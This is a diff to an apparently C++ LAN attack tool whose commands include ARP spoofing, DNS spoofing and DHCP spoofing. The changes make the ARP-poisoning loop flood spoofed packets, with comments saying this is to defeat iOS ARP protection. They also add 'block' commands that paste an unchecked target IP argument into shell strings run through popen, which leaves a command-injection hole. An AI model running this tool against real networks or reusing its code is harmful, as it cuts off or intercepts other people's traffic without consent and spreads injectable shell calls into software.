@@ -18,6 +18,9 @@ void print_usage(const char* prog) {
     std::cerr << "  scan <interface> <subnet_prefix>    Scan network" << std::endl;
     std::cerr << "  mac <interface> <ip>               Get MAC for IP" << std::endl;
     std::cerr << "  block <interface> <target_ip> <gateway_ip> <our_mac>" << std::endl;
+    std::cerr << "  block_iptables_drop <target_ip>    Block via iptables DROP" << std::endl;
+    std::cerr << "  block_iptables_redirect <target_ip> Redirect to null route" << std::endl;
+    std::cerr << "  block_traffic_control <interface> <target_ip>  Block via tc rate limit" << std::endl;
     std::cerr << "  dns_spoof <interface> <domain> <spoofed_ip> [upstream_dns]    DNS spoofing" << std::endl;
     std::cerr << "  dhcp_spoof <interface> <target_mac> <spoofed_ip> <gateway_ip> [dns_server]    DHCP spoofing" << std::endl;
 }
@@ -102,25 +105,31 @@ int main(int argc, char* argv[]) {
         std::cout << "BLOCK_STARTED: " << target_ip << std::endl;
         int count = 0;
         while (true) {
-            // Tell target we are the gateway
-            // "Target, the MAC for Gateway is [OurMac]"
-            if (!arp_send_packet(iface, gateway_ip, our_mac, target_ip, target_mac.c_str(), false)) {
-                std::cerr << "ERROR: Failed to send spoof packet to target" << std::endl;
-            }
-            
-            // Tell gateway we are the target
-            // "Gateway, the MAC for Target is [OurMac]"
-            if (!gateway_mac.empty()) {
-                if (!arp_send_packet(iface, target_ip, our_mac, gateway_ip, gateway_mac.c_str(), false)) {
-                    std::cerr << "ERROR: Failed to send spoof packet to gateway" << std::endl;
+            // Send multiple ARP packets per iteration for iOS compatibility
+            // iOS has ARP protection, needs packet flood to override cache
+            for (int i = 0; i < 3; i++) {
+                // Tell target we are the gateway
+                // "Target, the MAC for Gateway is [OurMac]"
+                if (!arp_send_packet(iface, gateway_ip, our_mac, target_ip, target_mac.c_str(), false)) {
+                    std::cerr << "ERROR: Failed to send spoof packet to target" << std::endl;
                 }
+                
+                // Tell gateway we are the target
+                // "Gateway, the MAC for Target is [OurMac]"
+                if (!gateway_mac.empty()) {
+                    if (!arp_send_packet(iface, target_ip, our_mac, gateway_ip, gateway_mac.c_str(), false)) {
+                        std::cerr << "ERROR: Failed to send spoof packet to gateway" << std::endl;
+                    }
+                }
+                
+                usleep(50000); // 50ms between packets
             }
             
-            if (++count % 10 == 0) {
-                std::cout << "DEBUG: Sent " << count << " spoofing packets..." << std::endl;
+            if (++count % 5 == 0) {
+                std::cout << "DEBUG: Sent " << (count * 2) << " spoofing packets..." << std::endl;
             }
             
-            usleep(500000); // 500ms - more aggressive
+            usleep(200000); // 200ms between iterations
         }
     }
     else if (command == "unblock") {
@@ -173,6 +182,110 @@ int main(int argc, char* argv[]) {
             }
 
             usleep(300000); // 300ms - very aggressive for broadcast
+        }
+    }
+    else if (command == "block_iptables_drop") {
+        if (argc < 3) {
+            print_usage(argv[0]);
+            return 1;
+        }
+        const char* target_ip = argv[2];
+        
+        std::cout << "DEBUG: Blocking " << target_ip << " via blackhole route (DROP method)" << std::endl;
+        fflush(stdout);
+        
+        // Use blackhole route - most reliable method
+        char cmd[256];
+        snprintf(cmd, sizeof(cmd),
+            "ip route add blackhole %s 2>&1; echo 'ROUTE_DONE'",
+            target_ip);
+        
+        FILE* fp = popen(cmd, "r");
+        if (fp) {
+            char buf[256] = {0};
+            while (fgets(buf, sizeof(buf), fp)) {
+                std::cout << "ROUTE: " << buf;
+                fflush(stdout);
+            }
+            pclose(fp);
+            std::cout << "BLOCK_IPTABLES_DROP_STARTED: " << target_ip << std::endl;
+            fflush(stdout);
+            // Route persists in kernel - no need to keep process alive
+            return 0;
+        } else {
+            std::cerr << "ERROR: Failed to execute ip route" << std::endl;
+            fflush(stderr);
+            return 1;
+        }
+    }
+    else if (command == "block_iptables_redirect") {
+        if (argc < 3) {
+            print_usage(argv[0]);
+            return 1;
+        }
+        const char* target_ip = argv[2];
+        
+        std::cout << "DEBUG: Blocking " << target_ip << " via blackhole route" << std::endl;
+        
+        // Use blackhole route
+        char cmd[256];
+        snprintf(cmd, sizeof(cmd),
+            "ip route add blackhole %s 2>&1; echo 'ROUTE_DONE'",
+            target_ip);
+        
+        FILE* fp = popen(cmd, "r");
+        if (fp) {
+            char buf[256] = {0};
+            while (fgets(buf, sizeof(buf), fp)) {
+                std::cout << "ROUTE: " << buf;
+                fflush(stdout);
+            }
+            pclose(fp);
+            std::cout << "BLOCK_IPTABLES_REDIRECT_STARTED: " << target_ip << std::endl;
+            fflush(stdout);
+            // Route persists in kernel - no need to keep process alive
+            return 0;
+        } else {
+            std::cerr << "ERROR: Failed to execute ip route" << std::endl;
+            fflush(stderr);
+            return 1;
+        }
+    }
+    else if (command == "block_traffic_control") {
+        if (argc < 4) {
+            print_usage(argv[0]);
+            return 1;
+        }
+        const char* target_ip = argv[3];
+        
+        std::cout << "DEBUG: Blocking " << target_ip << " via iptables DROP (tc fallback)" << std::endl;
+        
+        // Use iptables DROP (same as DROP method)
+        char cmd[512];
+        snprintf(cmd, sizeof(cmd),
+            "iptables -I FORWARD -s %s -j DROP 2>&1; "
+            "iptables -I FORWARD -d %s -j DROP 2>&1; "
+            "iptables -I INPUT -s %s -j DROP 2>&1; "
+            "iptables -I OUTPUT -d %s -j DROP 2>&1; "
+            "echo 'TC_DONE'",
+            target_ip, target_ip, target_ip, target_ip);
+        
+        FILE* fp = popen(cmd, "r");
+        if (fp) {
+            char buf[256] = {0};
+            while (fgets(buf, sizeof(buf), fp)) {
+                std::cout << "TC: " << buf;
+                fflush(stdout);
+            }
+            pclose(fp);
+            std::cout << "BLOCK_TRAFFIC_CONTROL_STARTED: " << target_ip << std::endl;
+            fflush(stdout);
+            // Rules persist in kernel - no need to keep process alive
+            return 0;
+        } else {
+            std::cerr << "ERROR: Failed to execute iptables" << std::endl;
+            fflush(stderr);
+            return 1;
         }
     }
     else if (command == "dhcp_spoof") {
